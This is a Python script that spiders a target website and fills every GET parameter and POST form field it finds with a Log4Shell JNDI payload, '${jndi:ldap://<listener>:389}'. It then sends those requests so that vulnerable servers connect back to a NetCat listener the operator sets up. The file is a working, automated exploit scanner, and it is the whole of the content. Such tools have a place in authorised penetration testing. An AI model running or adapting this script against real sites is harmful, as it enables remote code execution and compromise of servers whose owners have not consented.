from bs4 import BeautifulSoup
from requests_html import HTMLSession
import urllib.request, urllib.error
import re, sys, ssl

links = ["/"]
oldLinks = []
details = {}
session = HTMLSession()
rootURL = ' '.join(sys.argv[1:])
parser = 'html.parser'
payload = ''
listener = ''


def get_param_details(get_request):

   """Fills GET parameters with JNDI payload"""
   # set payload
   payload = '${jndi:ldap://' + str(listener) + ':389}'
   # replace parameter input with payload
   if ("&" in get_request):
   	for i in re.findall('=(.*)&', get_request):
	   	get_request = get_request.replace(i, payload)
   # replace last parameter input with payload  
   if ("=" in get_request): 		
   	get_request = get_request.replace(get_request[get_request.rfind('=')+1:len(get_request)], payload)
   return(get_request)

def get_form_details(form):

    """Returns the HTML details of a form,
    including action, method and list of form controls (inputs, etc)"""
    # get the form action (requested URL)
    action = form['action']
    # get the form method (POST, GET, DELETE, etc)
    method = form['method']
    # set payload
    payload = '${jndi:ldap://' + str(listener) + ':389}'
    # get all form inputs
    inputs = []
    for input_tag in form.find_all("input"):
        # get type of input form control
        input_type = ''
        if 'type' in input_tag:
        	input_type = input_tag['type']
        # get name attribute
        input_name = ''
        if 'name' in input_tag:
        	input_name = input_tag['name']
        # set default value to test
        input_value = payload
        # add everything to that list
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details
    
def spider(soup):

	# find all <a> tags with href attribute
	for link in soup.find_all('a', href=True):
		# exclude invalid links and emails
		if (len(link['href']) > 1 and '@' not in link['href']):
			# validate href format and exclude invalid links
			if (link['href'].startswith(rootURL)):
				link['href'] = link['href'].replace(rootURL, '')
			elif (link['href'].startswith('http') and not link['href'].startswith(rootURL)):
				continue
			elif (link['href'].startswith('mailto:')):
				continue
			elif (".com" in link['href']):
				continue
				
			# make href start with '/'
			if (not link['href'].startswith('/')):
				link['href'] = '/' + link['href']
			
			# store validated href
			newLink = link['href']
			
			# if link hasn't been spidered before
			if newLink not in oldLinks:
				
				# if link has GET parameters
				if ("?" in link['href']):
					# prepare GET Request
					newLink = get_param_details(link['href'])
					# format link
					if not newLink.startswith('/'):
						newLink = '/' + newLink
					# output GET /path
					print("GET " + newLink)
					# execute GET request with payload
					try:
						# format GET request
						req = urllib.request.Request(rootURL + newLink)
						req.add_header('User-Agent', "Mozilla/5.0")
						#req.add_header('Authorization', "<token>")
						#context = ssl._create_unverified_context()
						resp = urllib.request.urlopen(req)
						# exclude from being re-attempted
						oldLinks.append(link['href'])
						
					except urllib.error.HTTPError as err:
						# handle errors
						if err.code == 404:
					    		continue
						elif err.code == 403:
					    		print("403 forbidden, possible Firewall in place")
					    		continue
						elif err.code == 302:
					    		continue
						elif err.code == 301:
					    		continue
						elif err.code == 401:
					    		continue
						else:
					    		raise
				else:
					# add to Spider queue
					if newLink not in links:
						links.append(newLink)
	
	# find all <form> tags for POST requests			
	for link in soup.find_all('form'):
		# validate POST request
		if (link.has_attr("action") and (not link['action'].startswith('http') or link['action'].startswith(rootURL)) and link.has_attr("method") and link['method'].upper() == "POST"):
			# prepare POST Request
			if link['action'] not in oldLinks:
				# get details of the POST request
				formDetails = get_form_details(link)
				headers = {'User-Agent': 'Mozilla/5.0'}
				#headers = {'User-Agent': 'Mozilla/5.0', 'Authorization':'<token>'}
				# execute POST request
				if not details['action'].startswith('/'):
					details['action'] = '/' + details['action']
				print("POST " + details['action'])
				submitForm = session.post(rootURL + details["action"], data=formDetails, headers=headers)
				details.clear()
				# exclude from being re-attempted
				oldLinks.append(link['action'])

def make_http_request():

	print("Starting Web Spider")
	print("-------------------")
	print()
	
	# run through queued up links, starting is just '/'
	for link in links:
		
		try:
			req = urllib.request.Request(rootURL + link)
			req.add_header('User-Agent', "Mozilla/5.0")
			#req.add_header('Authorization', "<token>")
			#context = ssl._create_unverified_context()
			resp = urllib.request.urlopen(req)

			soup = BeautifulSoup(resp, parser, from_encoding=resp.info().get_param('charset'))
			print("SPIDERING -> " + rootURL + link)
			spider(soup)
			#links.remove(link)
		
		except urllib.error.HTTPError as err:
			if err.code == 404:
				continue
			elif err.code == 403:
				print("403 forbidden, possible Firewall in place")
				continue
			elif err.code == 302:
				continue
			elif err.code == 301:
				continue
			elif err.code == 401:
				continue
			else:
				raise
				
	

if __name__ == "__main__":

    print("Remember to start NetCat Listener on port 389!!!")
    listener = input("Enter IP address of your Listener: ")
    print()
    
    # format rootURL
    if rootURL.endswith('/'):
    	rootURL = rootURL[:-1]

    # start spidering
    make_http_request()



    
    
    
    
		
